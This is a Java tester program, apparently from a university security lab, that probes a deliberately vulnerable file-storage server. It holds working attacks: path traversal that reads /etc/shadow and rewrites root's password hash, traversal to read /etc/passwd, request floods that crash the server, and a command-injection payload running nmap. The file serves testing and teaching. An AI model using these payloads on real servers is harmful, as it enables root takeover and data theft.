package ch.zhaw.securitylab.publicfilestorage;

import java.io.*;
import java.net.*;
import static ch.zhaw.securitylab.publicfilestorage.Common.*;

public class PublicFileStorageTester {

    // Hostname of the server to test
    private static String host;

    // Flags to be set via command line parameters
    private static int attack = -1;

    // Test files and content
    private static final String TEST_FILE_GET = "file1.txt";
    private static final String TEST_FILE_PUT = "testfile.txt";
    private static final String TEST_CONTENT = "Terrific test file content!\nSpread across two lines.\n";
    
    // The hash of the password "test"
    private static final String ROOT_PASSWORD = "$y$j9T$gnShDAET1KVc7yp81aF.t0$WjeWIbl6mM.PesF1P/q02i3OzQHBZyfXAunZ6WvNBD6";
    
    /* Run the test(s) */
    private void run() throws IOException {

        System.out.println();
        
        // Test functionality
        if ((attack == 0) || (attack == -1)) {
            runTests(0);
        }
        
        // Try to compromise the root account
        if ((attack == 1) || (attack == -1)) {
            runCompromiseRoot(1);
        }
        
        // Try to crash the server by sending an empty request
        if ((attack == 2) || (attack == -1)) {
            runEmptyRequest(2);
        }

        // Try to crash the server by sending a long first request line 
        if ((attack == 3) || (attack == -1)) {
            runLongFirstRequestLine(3);
        }

        // Try to crash the server by sending a PUT request with a long line 
        if ((attack == 4) || (attack == -1)) {
            runPUTRequestWithLongLine(4);
        }

        // Try to crash the server by sending a PUT request with many lines 
        if ((attack == 5) || (attack == -1)) {
            runPUTRequestWithManyLines(5);
        }
    
        // Try to get /etc/passwd (variant 1) 
        if ((attack == 6) || (attack == -1)) {
            runGetPasswdFileVar1(6);
        }
        
        // Try to get /etc/passwd (variant 2) 
        if ((attack == 7) || (attack == -1)) {
            runGetPasswdFileVar2(7);
        }
    
        // Try to do a local portscan on the server
        if ((attack == 8) || (attack == -1)) {
            runCommandInjection(8);
        }
    }
    
    /* Runs the tests to check correct functionality of GET, PUT and SYSTEM */
    private void runTests(int attackNumber) throws IOException {
        
        // Test 1e: Check GET (file existing)
        System.out.print("Test " + attackNumber + "a: Check GET (file existing)... ");
        Response response = doGET(TEST_FILE_GET);
        System.out.println("done");
        if (response.status.equals(OK)) {
            System.out.println("Test **SUCCEEDED**");
        } else {
            System.out.println("Test **FAILED**");
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
        
        // Test 1b: Check GET (file not existing)
        System.out.print("Test " + attackNumber + "b: Check GET (file not existing)... ");
        response = doGET("not-existing.txt");
        System.out.println("done");
        if (response.status.equals(NOK)) {
            System.out.println("Test **SUCCEEDED**");
        } else {
            System.out.println("Test **FAILED**");
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
        
        // Test 1c: Check PUT
        System.out.print("Test " + attackNumber + "c: Check PUT... ");
        response = doPUT(TEST_FILE_PUT, TEST_CONTENT);
        System.out.println("done");
        if (response.status.equals(OK)) {
            System.out.println("Test **SUCCEEDED**");
        } else {
            System.out.println("Test **FAILED**");
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();

        // Test 1d: Check SYSTEM (command existing)
        System.out.print("Test " + attackNumber + "d: Check SYSTEM (command existing)... ");
        response = doSYSTEM(COMMAND_USAGE, "*");
        System.out.println("done");
        if (response.status.equals(OK)) {
            System.out.println("Test **SUCCEEDED**");
        } else {
            System.out.println("Test **FAILED**");
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
        
        // Test 1e: Check SYSTEM (command not existing)
        System.out.print("Test " + attackNumber + "e: Check SYSTEM (command not existing)... ");
        response = doSYSTEM("not-existing", "*");
        System.out.println("done");
        if (response.status.equals(NOK)) {
            System.out.println("Test **SUCCEEDED**");
        } else {
            System.out.println("Test **FAILED**");
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
    }
    
    /* Run the attack to compromise the root account */
    private void runCompromiseRoot(int attackNumber) throws IOException {
        checkServerRunning();
        System.out.print("Attack " + attackNumber + ": Compromise root... ");
        
        // Get shadow file
        Response response = doGET("../../../../../../../../../../../../../../../etc/shadow");
        if (response.status.equals(NOK)) {
            System.out.println("done");
            System.out.println("Attack **FAILED** (shadow file could not be read)");
        } else {

            // Shadow file could be read, build array of shadow file lines
            String[] shadowLines = response.content.split("\n");

            // Create new shadow file content with replaced root password
            StringBuilder newShadowFile = new StringBuilder();
            for (int i=0; i < shadowLines.length; ++i) {
                String[] shadowLine = shadowLines[i].split(":");
                if (shadowLine[0].equals("root")) {
                    StringBuilder newRootLine = new StringBuilder("root:" + ROOT_PASSWORD);
                    for (int j=2; j < shadowLine.length; ++j) {
                        newRootLine.append(":").append(shadowLine[j]);
                    }
                    newRootLine.append(":::");
                    newShadowFile.append(newRootLine).append("\n");
                } else {
                    newShadowFile.append(shadowLines[i]).append("\n");
                }
            }

            // Write shadow file to server
            response = doPUT("../../../../../../../../../../../../../../../etc/shadow", 
                    newShadowFile.toString());
            System.out.println("done");
            if (response.status.equals(NOK)) {
                System.out.println("Attack **FAILED** (shadow file could not be written)");
            } else {
                System.out.println("Attack **SUCCEEDED** (compromized root by setting password to 'test')");
            }
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
    }
    
    /* Run the attack that consists of an empty request */
    private void runEmptyRequest(int attackNumber) throws IOException {
        checkServerRunning();
        System.out.print("Attack " + attackNumber + ": Send empty request... ");
    
        // Send empty request
        Response response = doCustom("\n");
        System.out.println("done");
        if (response.status == null) {
            System.out.println("Attack **SUCCEEDED** (server crashed)");
            response.status = "";
        } else {
            if (response.status.equals(NOK)) {
                System.out.println("Attack **FAILED** (server did not crash)");
            } else {
                System.out.println("Attack **FAILED** (server did not crash, but didn't respond with NOK)");
            }
         }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
    }
    
    /* Run the attack that consists of a long first request line */
    private void runLongFirstRequestLine(int attackNumber) throws IOException {
        checkServerRunning();
        System.out.print("Attack " + attackNumber + ": Send a long request... ");
        
        // Connect and send a long request
        Socket socket = connect();
        OutputStreamWriter toServer = getWriter(socket);
        BufferedReader fromServer = getReader(socket);
        Response response = new Response();
        long count = 0;
        try {
            for (; count < 500000000; ++count) {
                toServer.write("10_Bytes__");
            }
            toServer.flush();
            System.out.println("done (connection not broken after " + (10 * count) + " Bytes sent)");
            response.status = fromServer.readLine();
            response.content = readContent(fromServer);
            if (response.status.equals(NOK)) {
                System.out.println("Attack **FAILED** (server did not crash)");
            } else {
                System.out.println("Attack **FAILED** (server did not crash, but didn't respond with NOK)");
            }
        } catch (IOException e) {
            System.out.println("done (connection broken after " + (10 * count) + " Bytes sent)");
            try {
                connectTest();
                response.status = fromServer.readLine();
                response.content = readContent(fromServer);
                if (response.status.equals(NOK)) {
                    System.out.println("Attack **FAILED** (server did not crash)");
                } else {
                    System.out.println("Attack **FAILED** (server did not crash, but didn't respond with NOK)");
                }
            } catch (IOException e1) {
                System.out.println("Attack **SUCCEEDED** (server crashed)");
            }
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
    }
   
    /* Run the attack that consists of a PUT request with a long line */
    private void runPUTRequestWithLongLine(int attackNumber) throws IOException {
        checkServerRunning();
        System.out.print("Attack " + attackNumber + ": Send a PUT request with a long line... ");

        // Connect and send PUT request with a long line
        Socket socket = connect();
        OutputStreamWriter toServer = getWriter(socket);
        BufferedReader fromServer = getReader(socket);
        Response response = new Response();
        toServer.write(PUT + " longfile.txt\n" + CONTENT + "\n");
        long count = 0;
        try {
            for (; count < 500000000; ++count) {
                toServer.write("10_Bytes__");
            }
            toServer.flush();
            System.out.println("done (connection not broken after " + (10 * count) + " Bytes sent)");
            response.status = fromServer.readLine();
            response.content = readContent(fromServer);
            if (response.status.equals(NOK)) {
                System.out.println("Attack **FAILED** (server did not crash)");
            } else {
                System.out.println("Attack **FAILED** (server did not crash, but didn't respond with NOK)");
            }
        } catch (IOException e) {
            System.out.println("done (connection broken after " + (10 * count) + " Bytes sent)");
            try {
                connectTest();
                response.status = fromServer.readLine();
                response.content = readContent(fromServer);
                if (response.status.equals(NOK)) {
                    System.out.println("Attack **FAILED** (server did not crash)");
                } else {
                    System.out.println("Attack **FAILED** (server did not crash, but didn't respond with NOK)");
                }
            } catch (IOException e1) {
                System.out.println("Attack **SUCCEEDED** (server crashed)");
            }
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
    }
   
    /* Run the attack that consists of a PUT request with many lines */
    private void runPUTRequestWithManyLines(int attackNumber) throws IOException {
        checkServerRunning();
        System.out.print("Attack " + attackNumber + ": Send a PUT request with many lines... ");
        
        // Connect and send PUT request with many lines
        Socket socket = connect();
        OutputStreamWriter toServer = getWriter(socket);
        BufferedReader fromServer = getReader(socket);
        Response response = new Response();
        toServer.write("PUT longfile.txt\n" + CONTENT + "\n");
        long count = 0;
        try {
            for (; count < 100000000; ++count) {
                for (int i=0; i < 50; ++i) {
                    toServer.write("10_Bytes__");
                }
                toServer.write("\n");
            }
            toServer.flush();
            System.out.println("done (connection not broken after " + (500 * count) + " Bytes sent)");
            response.status = fromServer.readLine();
            response.content = readContent(fromServer);
            if (response.status.equals(NOK)) {
                System.out.println("Attack **FAILED** (server did not crash)");
            } else {
                System.out.println("Attack **FAILED** (server did not crash, but didn't respond with NOK)");
            }
        } catch (IOException e) {
            System.out.println("done (connection broken after " + (500 * count) + " Bytes sent)");
            try {
                connectTest();
                response.status = fromServer.readLine();
                response.content = readContent(fromServer);
                if (response.status.equals(NOK)) {
                    System.out.println("Attack **FAILED** (server did not crash)");
                } else {
                    System.out.println("Attack **FAILED** (server did not crash, but didn't respond with NOK)");
                }
            } catch (IOException e1) {
                System.out.println("Attack **SUCCEEDED** (server crashed)");
            }
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
    }
   
    /* Run the first variant of the attack to get /etc/passwd */
    private void runGetPasswdFileVar1(int attackNumber) throws IOException {
        checkServerRunning();
        System.out.print("Attack " + attackNumber + ": Get /etc/passwd (variant 1)... ");
        
        // Get /etc/passwd
        Response response = doGET("../../../../../../../../../../../../../../../etc/passwd");
        System.out.println("done");
        if (response.status.equals(OK)) {
            System.out.println("Attack **SUCCEEDED** (file could be read)");
        } else {
            System.out.println("Attack **FAILED** (file could not be read)");
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
    }
    
    /* Run the second variant of the attack to get /etc/passwd */
    private void runGetPasswdFileVar2(int attackNumber) throws IOException {
        checkServerRunning();
        System.out.print("Attack " + attackNumber + ": Get /etc/passwd (variant 2)... ");
        
        // Get /etc/passwd
        Response response = doGET("..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd");
        System.out.println("done");
        if (response.status.equals(OK)) {
            System.out.println("Attack **SUCCEEDED** (file could be read)");
        } else {
            System.out.println("Attack **FAILED** (file could not be read)");
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
    } 
    
    /* Run the attack to do command injection (using a portscan as an example) */
    private void runCommandInjection(int attackNumber) throws IOException {
        checkServerRunning();
        System.out.print("Attack " + attackNumber + ": Do a local portscan on the server... ");
        
        // Do a local portscan
        Response response = doSYSTEM(COMMAND_USAGE, "*; nmap localhost");
        System.out.println("done");
        if (response.status.equals(OK)) {
            System.out.println("Attack **SUCCEEDED** (portscan could be done)");
        } else {
            System.out.println("Attack **FAILED** (portscan could not be done)");
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
    }

    /* Do a GET request and return the response */
    private Response doGET(String filename) throws IOException {
        Socket socket = connect();
        OutputStreamWriter toServer = getWriter(socket);
        BufferedReader fromServer = getReader(socket);
        String request = createGETRequest(filename);
        toServer.write(request);
        toServer.flush();
        socket.shutdownOutput();
        Response response = new Response();
        response.status = fromServer.readLine();
        response.content = readContent(fromServer);
        socket.close();
        return response;
    }
   
    /* Do a PUT request and return the response */
    private Response doPUT(String filename, String content) throws IOException {
        Socket socket = connect();
        OutputStreamWriter toServer = getWriter(socket);
        BufferedReader fromServer = getReader(socket);
        String request = createPUTRequest(filename, content);
        toServer.write(request);
        toServer.flush();
        socket.shutdownOutput();
        Response response = new Response();
        response.status = fromServer.readLine();
        response.content = readContent(fromServer);
        socket.close();
        return response;
    }

    /* Do a COMMAND request and return the response s */
    private Response doSYSTEM(String command, String options) throws IOException {
        Socket socket = connect();
        OutputStreamWriter toServer = getWriter(socket);
        BufferedReader fromServer = getReader(socket);
        String request = createSYSTEMRequest(command, options);
        toServer.write(request);
        toServer.flush();
        socket.shutdownOutput();
        Response response = new Response();
        response.status = fromServer.readLine();
        response.content = readContent(fromServer);
        socket.close();
        return response;
    }
    
    /* Do a custom request and return the response */
    private Response doCustom(String request) throws IOException {
        Socket socket = connect();
        OutputStreamWriter toServer = getWriter(socket);
        BufferedReader fromServer = getReader(socket);
        toServer.write(request);
        toServer.flush();
        socket.shutdownOutput();
        Response response = new Response();
        response.status = fromServer.readLine();
        response.content = readContent(fromServer);
        socket.close();
        return response;
    }
       
    /* Create a GET request */
    private String createGETRequest(String filename) {
        return GET + " " + filename + "\n" + DONE + "\n";
    }

    /* Create a PUT request */
    private String createPUTRequest(String filename, String content) {
        return PUT + " " + filename + "\n" + CONTENT + "\n" + content + "\n" + DONE + "\n";
    }

    /* Create a COMMAND request */
    private String createSYSTEMRequest(String command, String options) {
        return SYSTEM + " " + command + " " + options + "\n" + DONE + "\n";
    }
    
    /* Read content from server */
    private String readContent(BufferedReader fromServer) throws IOException {
        StringBuilder content = new StringBuilder();
        
        // Process remaining lines and return content
        String line = fromServer.readLine();
        while ((line != null) && (!line.equals(DONE))) {
            if(!line.equals(CONTENT)) {
                content.append(line).append("\n");
            }
            line = fromServer.readLine();
        }
        return content.toString();
    }
    
    /* Establishes a connection */
    private Socket connect() throws IOException {
        return new Socket(host, PORT);
    }

    /* Gets a BufferedReader from a socket */
    private BufferedReader getReader(Socket socket) throws IOException {
        return new BufferedReader(new InputStreamReader(socket.getInputStream()));
    }

    /* Gets an OutputStreamWriter from a socket */
    private OutputStreamWriter getWriter(Socket socket) throws IOException {
        return new OutputStreamWriter(socket.getOutputStream());
    }

    /* Tests if the connection can be established */
    private void connectTest() throws IOException {
        try {
            Thread.sleep(1000);
        } catch (Exception e) {
        }
        Socket socket = connect();
        socket.close();
    }

    /* Tests if the server is running at all */
    private void checkServerRunning() {
        try {
            connectTest();
        } catch (IOException e) {
            System.out.println("Server does not appear to be running, exiting\n");
            System.exit(0);
        }
    }

    /* Tests if the server is still running */
    private void checkServerStillRunning() {
        try {
            Thread.sleep(1000);
            connectTest();
            System.out.println("Server still running");
        } catch (Exception e) {
            System.out.println("Server crashed");
        }
    }
    
    /* Remove the last char from a string and return it as a new string */
    private String removeLastChar(String input) {
        if (input.length() == 0) {
            return input;
        } else {
            return input.substring(0, input.length() - 1);
        }
    }
    
    /* This method is called when the program is run from the command line */
    public static void main(String argv[]) throws IOException {

        // Create a PublicFileStorageTester object, and run it
        try {
            host = argv[0];
            if (argv.length > 1) {
                attack = Integer.parseInt(argv[1]);
                if ((attack < 0) || (attack > 8)) {
                    throw (new Exception());
                }
            }
        } catch (Exception e) {
            System.out.println("Usage: java SecureFileStorageTester hostname {0-8}\n");
            System.exit(0);
        }
        PublicFileStorageTester swst = new PublicFileStorageTester();
        swst.run();
    }
}

class Response {
    public String status = "";
    public String content = "";
}